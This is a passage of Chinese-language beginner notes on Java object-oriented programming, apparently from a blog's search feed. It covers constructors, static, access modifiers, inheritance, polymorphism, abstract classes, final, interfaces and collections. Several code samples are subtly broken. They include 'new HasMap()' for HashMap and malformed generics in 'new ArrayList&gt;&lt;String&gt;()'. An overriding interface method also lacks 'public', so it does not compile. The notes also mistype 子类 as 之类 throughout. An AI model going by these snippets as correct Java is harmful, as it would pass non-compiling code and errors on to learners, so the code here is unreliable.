类名(){}//主要的做用是初始化操作}</code></pre><h3 id="5-构造方法重载"><a href="#5-构造方法重载" class="headerlink" title="5.构造方法重载"></a>5.构造方法重载</h3><h5 id="在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法"><a href="#在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法" class="headerlink" title="在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法"></a>在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法</h5><pre><code class="java">public class 类名{    public 类名(){    }    public 类名(String name,int age){    }}</code></pre><h3 id="6-构造方法的执行"><a href="#6-构造方法的执行" class="headerlink" title="6.构造方法的执行"></a>6.构造方法的执行</h3><pre><code class="java">new 类名();---&gt;执行构造方法super();---&gt;执行了父类的构造方法</code></pre><pre><code>###     7.static静态修饰符</code></pre><h5 id="静态修饰符可以修饰属性，方法，代码块"><a href="#静态修饰符可以修饰属性，方法，代码块" class="headerlink" title="静态修饰符可以修饰属性，方法，代码块"></a>静态修饰符可以修饰属性，方法，代码块</h5><pre><code class="java">类名.属性类名.方法名</code></pre><h3 id="8-java内存"><a href="#8-java内存" class="headerlink" title="8.java内存"></a>8.java内存</h3><h3 id="（栈和堆，static，方法区，GC（垃圾回收机制））"><a href="#（栈和堆，static，方法区，GC（垃圾回收机制））" class="headerlink" title="（栈和堆，static，方法区，GC（垃圾回收机制））"></a>（栈和堆，static，方法区，GC（垃圾回收机制））</h3><hr><h2 id="第三章-面向对象三大特征—封装"><a href="#第三章-面向对象三大特征—封装" class="headerlink" title="第三章 面向对象三大特征—封装"></a>第三章 面向对象三大特征—封装</h2><ul><li><p>封装的概念</p></li><li><p>封装的步骤</p><ul><li>把属性私有化（private）</li><li>对这些属性设置get和set方法</li><li>调用处理这些方法</li></ul></li><li><p>封装的作用：避免一些用一些不合乎常理的操作</p></li><li><p>修饰符</p><ul><li><p><strong>public—&gt;公共的：</strong>在一个项目中都可以访问，权限最高</p></li><li><p><strong>private—&gt;私有的：</strong>只能在本类中进行访问，权限最低</p></li><li><p><strong>protected—&gt;安全的，受保护的：</strong>同一个包能进行访问，继承中之类可以访问父类</p></li><li><p><strong>default—&gt;默认的：</strong>同一个包能访问</p><table><thead><tr><th align="center">修饰符</th><th align="center">同一个类</th><th align="center">同一个包</th><th align="center">子类</th><th>所有类</th></tr></thead><tbody><tr><td align="center">private(私有的)</td><td align="center">*</td><td align="center"></td><td align="center"></td><td></td></tr><tr><td align="center">default(常规)</td><td align="center">*</td><td align="center">*</td><td align="center"></td><td></td></tr><tr><td align="center">protected(受保护的)</td><td align="center">*</td><td align="center">*</td><td align="center">*</td><td></td></tr><tr><td align="center">public(公共的)</td><td align="center">*</td><td align="center">*</td><td align="center">*</td><td>*</td></tr></tbody></table><h6 id="从小到大优先级"><a href="#从小到大优先级" class="headerlink" title="从小到大优先级:"></a><code>从小到大优先级:</code></h6><p><code>private &lt; default &lt; protected &lt; public</code></p></li></ul></li></ul><hr><h2 id="第四章-面向对象三大特征—继承"><a href="#第四章-面向对象三大特征—继承" class="headerlink" title="第四章 面向对象三大特征—继承"></a>第四章 面向对象三大特征—继承</h2><ol><li>继承的概念：<code>父亲儿子，电影《西虹市首富》</code></li></ol><ol start="2"><li><p>.继承的关键字：<code>extends</code></p></li><li><p>继承的语法：<code>public class 类名  extends 父类{}</code></p></li><li><p>使用，在之类中：</p></li></ol><pre><code>   可以直接调用父类的非私有属性和方法   可以用super.方法   super.属性</code></pre><ol start="5"><li><p>父类构造方法调用：super();</p><pre><code>调用父类的构造方法必须在之类中调用必须实在之类构造方法的第一行代码</code></pre></li></ol><ol start="6"><li><p>重写@Override</p><pre><code>必须继承方法名一致，参数个数，顺序，类型全部一致</code></pre><hr><h2 id="第五章-面向对象（多态）"><a href="#第五章-面向对象（多态）" class="headerlink" title="第五章 面向对象（多态）"></a>第五章 面向对象（多态）</h2><ul><li><p>多态的概念</p></li><li><p>多态的必要条件</p><ul><li>继承</li><li>重写</li><li>父类引用指向子类对象（向上转型）</li></ul></li><li><p>多态的使用</p><ul><li><pre><code class="java">public class Father{  public void cooking(){                 System.out.println(&quot;米饭&quot;);             }         }      public class Son extends Father{             @Override             public void cooking(){                 System.out.println(&quot;熬粥&quot;);             }         }         public class Test {            public static void main(String[] args) {                Father son=new Son();                son.cooking();            }}</code></pre></li></ul></li><li><p>向下转型</p><ul><li><code>Son son=(Son)father;</code></li></ul></li></ul><hr><h2 id="第六章-抽象"><a href="#第六章-抽象" class="headerlink" title="第六章 抽象"></a>第六章 抽象</h2><ol><li><p>抽象的概念</p></li><li><p>抽象的关键字<br>  <code>abstract</code> <code>可以修饰类，可以修饰方法</code></p></li><li><p>抽象的用法 </p><pre><code class="java">  //抽象类  public abstract class 类名{      //抽象方法没有方法体      public abstract void 方法名();      }  //当父类是抽象类的时候，子类必须重写父类里面的抽象方法</code></pre></li><li><p>final修饰符：最终的<br>  <code>修饰变量，修饰方法，修饰类</code></p><pre><code class="tex">  1.当修饰变量时，变量转换成常量，常量的值不能改变    final int a=18;//a=18;不能改变,必须给一个初始值  2.当修饰方法时，该方法不能被重写  3.当修饰类时，该类不能被继承</code></pre><hr><h2 id="第七章-接口"><a href="#第七章-接口" class="headerlink" title="第七章 接口"></a>第七章 接口</h2><ol><li><p>接口的概念</p></li><li><p>接口的关键字<br><code>interface</code></p></li><li><p>接口的语法<br><code>File---&gt;new---&gt;interface//创建接口</code></p><pre><code class="java">public interface 接口名{}</code></pre></li><li><p>接口的用法<br><code>实现接口的关键字  implements</code></p><pre><code class="java">public interface 接口名{    //接口是纯抽象类    //接口里面的方法都是抽象方法    void setData();}public class Play implements 接口名{@Overridevoid setData(){    } }public class Test {    public static void main(String[] args) {        Play play=new Play();        play.setData();    }}</code></pre><p><em>注意接口可以进行多继承</em></p><p><code>public interface 接口名 extends 接口名，接口名{}</code></p><p>一般用法</p><p><code>public class 类名 extends 父类 implements 接口，接口{}</code></p></li></ol></li></ol></li></ol><hr><h2 id="第八章-集合框架"><a href="#第八章-集合框架" class="headerlink" title="第八章 集合框架"></a>第八章 集合框架</h2><ol><li><p>ArrayList</p><pre><code class="java">用法:ArrayList list=new ArrayList();list.add();//添加数据list.get();//获取数据</code></pre></li></ol><ol start="2"><li><p>Map</p><pre><code class="java">用法Map map=new HasMap();map.put(key,value);//key不能重复map.get(key);//获取key对象的value</code></pre></li></ol><ol start="3"><li><p>泛型</p><pre><code class="java">ArrayList&lt;String&gt; list=new ArrayList&gt;&lt;String&gt;();Map&lt;String,String&gt; map=new HasMap&lt;String,String&gt;();ArrayList&lt;Map&lt;String,String&gt;&gt; list=new ArrayList&gt;&lt;Map&lt;String,String&gt;&gt;();</code></pre></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>